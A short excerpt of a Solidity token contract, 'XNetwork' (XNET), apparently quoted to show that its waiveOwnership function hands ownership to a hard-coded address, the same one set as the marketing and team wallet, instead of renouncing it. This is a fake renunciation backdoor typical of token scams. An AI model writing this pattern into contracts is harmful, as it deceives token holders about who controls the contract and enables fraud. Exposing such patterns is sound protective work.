...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xa119ab7b3Ec4bF26b4a97A2a1d247ef994c7a5C6);
    }
...
contract XNetwork is Context, IERC20, Ownable {
    ...
    string private _name = "XNetwork";
    string private _symbol = "XNET";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xa119ab7b3Ec4bF26b4a97A2a1d247ef994c7a5C6);
    address payable public teamWalletAddress = payable(0xa119ab7b3Ec4bF26b4a97A2a1d247ef994c7a5C6);
